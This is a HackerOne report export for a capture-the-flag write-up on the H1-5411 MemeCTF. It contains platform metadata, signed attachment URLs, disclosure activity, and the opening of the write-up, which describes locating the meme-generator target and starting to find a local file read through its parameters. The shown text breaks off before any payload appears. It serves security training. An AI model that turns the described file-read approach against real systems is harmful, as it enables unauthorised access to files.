{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-10-08T16:25:21.749Z", 
    "voters": [
        "leonishan", 
        "spam404", 
        "0x9090", 
        "0xacb", 
        "eveeez", 
        "mygf", 
        "japz", 
        "sameerphad72", 
        "rewanth_cool", 
        "pofargst"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 416004, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-10-22T16:01:52.451Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "H1-5411 CTF Writeup", 
    "is_member_of_team?": null, 
    "vote_count": 10, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-11-07T16:25:21.795Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "Screen_Shot_2018-09-29_at_4.29.03_AM.png", 
            "type": "image/png", 
            "id": 352571, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/571/c54061615c07add9c7e5d78739ed64e4ba173759/Screen_Shot_2018-09-29_at_4.29.03_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c39dd089b29dc5e416af10f16d388181015f85a74d7590cc8a22a322c8cf50c3"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_4.40.12_AM.png", 
            "type": "image/png", 
            "id": 352576, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/576/0bae2a5bf172b379425539effd162aa2937a6557/Screen_Shot_2018-09-29_at_4.40.12_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a20bc60a8b2621da7c9abf4c0b6e51105ba374a96805a04fe240c2e11f0a139e"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_4.40.21_AM.png", 
            "type": "image/png", 
            "id": 352577, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/577/4a90440224dcf5ca99e9b47a9847ab4c55a5c2b3/Screen_Shot_2018-09-29_at_4.40.21_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de900583a7d6faf705f19b418794d043c2e0b82f56c4e673af3a90ba75249f58"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_4.46.28_AM.png", 
            "type": "image/png", 
            "id": 352580, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/580/bbb6847b688cbebbd0fc0dfd4f7edb6131da3845/Screen_Shot_2018-09-29_at_4.46.28_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9b8976bd9d26e4a1d2e4d11c289e4effe4cb6d4b36e8746e18dc48e9f1e9ba56"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_4.49.32_AM.png", 
            "type": "image/png", 
            "id": 352584, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/584/34413dcdda8ea632bfbdece2aa786d7a6181f723/Screen_Shot_2018-09-29_at_4.49.32_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=67b18433ce4aa288e9bef762c08c3fb6acb5113c367536b217aedc43af9cd748"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_5.25.11_AM.png", 
            "type": "image/png", 
            "id": 352604, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/604/781ce46ff1d99dc06a3c1dcdcdcdd92f3f8c5cc1/Screen_Shot_2018-09-29_at_5.25.11_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=71e5b5243246a304114dae710aec37f1965c060cba7d54746d31675eec18dbd1"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_5.25.19_AM.png", 
            "type": "image/png", 
            "id": 352605, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/605/d90692d4bf51b4ef86a42c64816b7972e931e29d/Screen_Shot_2018-09-29_at_5.25.19_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a326c65fa0a984fe62f9d13367c7e9e4f795a8d8446fb68856814acb4ef7757"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_6.03.01_AM.png", 
            "type": "image/png", 
            "id": 352614, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/614/2e2523c5ec929ec4e70ca56ea6d7100bcceb1a2b/Screen_Shot_2018-09-29_at_6.03.01_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64e99d4d9799850adb7ea3b6f86dc6fd0f166a8bb0af593ab24275e07bdb887c"
        }, 
        {
            "file_name": "Screen_Shot_2018-09-29_at_6.05.08_AM.png", 
            "type": "image/png", 
            "id": 352616, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/616/c8cbcabe4ee1424eea8ae8d1dc8d0b5ded600487/Screen_Shot_2018-09-29_at_6.05.08_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f1c7697b9ab1b36ec401814e8f1adea7ba7076aa04dee5001c01d5721e2639ef"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-09-29T02:02:58.602Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-29T02:06:41.470Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants! Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!", 
            "markdown_message": "<p>We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants! Please keep an eye on your email for your invite to the program!</p>\n\n<p>Best of luck and happy hacking!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 3404973, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "0x9090", 
                "url": "/0x9090"
            }, 
            "created_at": "2018-10-08T16:20:19.717Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-08T16:20:19.717Z", 
            "actor": {
                "username": "0xacb", 
                "url": "/0xacb", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Hello @lolwaleet,\n\nI'm closing this report now as resolved.\nFeel free to request public disclosure and publish a writeup on your blog!\n\nBest regards,\nAndr\u00e9", 
            "markdown_message": "<p>Hello <a href=\"/lolwaleet\">@lolwaleet</a>,</p>\n\n<p>I&#39;m closing this report now as resolved.<br>\nFeel free to request public disclosure and publish a writeup on your blog!</p>\n\n<p>Best regards,<br>\nAndr\u00e9</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 3449284, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-08T16:25:21.767Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-08T16:25:21.767Z", 
            "actor": {
                "username": "0x9090", 
                "url": "/0x9090", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/198/715/9bcd1ca37fd481d0e9ba9fca97e28a0bbdc6aeb4_medium.png?1542219127"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3449306, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-08T16:26:10.222Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-08T16:26:10.222Z", 
            "actor": {
                "username": "0x9090", 
                "url": "/0x9090", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/198/715/9bcd1ca37fd481d0e9ba9fca97e28a0bbdc6aeb4_medium.png?1542219127"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Thank You!", 
            "markdown_message": "<p>Thank You!</p>\n", 
            "type": "Activities::Comment", 
            "id": 3449312, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:52.475Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:52.475Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ", 
            "markdown_message": "<p>We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3514752, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:52.546Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:52.546Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3514753, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "0x9090", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/0x9090", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/198/715/e43cf207fc3650f4adc3eb03e3920cb9268404dd_small.png?1542219127"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -2526601.994453963, 
    "disclosed_at": "2018-10-22T16:01:52.525Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/416004", 
    "created_at": "2018-09-29T00:36:38.910Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>So, Hackerone posted a tweet about the Meme CTF Where barcode was in the tweet image by scanning it and decoding from hex I found this link : <a title=\"https://h1-5411.h1ctf.com/\" href=\"/redirect?signature=00972f96cdea7fcc79c8795f6ff3f4076438b7af&amp;url=https%3A%2F%2Fh1-5411.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://h1-5411.h1ctf.com/</span><i class=\"icon-external-link\"></i></a> where we can  create/generate a memes and for generating the meme this was used form GitHub which i found in source code analysis <code>https://github.com/trepmal/meme-gen</code>.</p>\n\n<h2 id=\"discovering-local-file-read\">Discovering Local File Read</h2>\n\n<p>There was a meme generator which generates the meme by from it&#39;s templates which was already present and it took 4 parameters: </p>\n\n<ul>\n<li>template  ( name of the template which is used to generate meme ) </li>\n<li>type ( Meme Type : image/text)</li>\n<li>top-text </li>\n<li>bottom-text</li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_4.29.03_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/571/c54061615c07add9c7e5d78739ed64e4ba173759/Screen_Shot_2018-09-29_at_4.29.03_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c39dd089b29dc5e416af10f16d388181015f85a74d7590cc8a22a322c8cf50c3\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/571/c54061615c07add9c7e5d78739ed64e4ba173759/Screen_Shot_2018-09-29_at_4.29.03_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6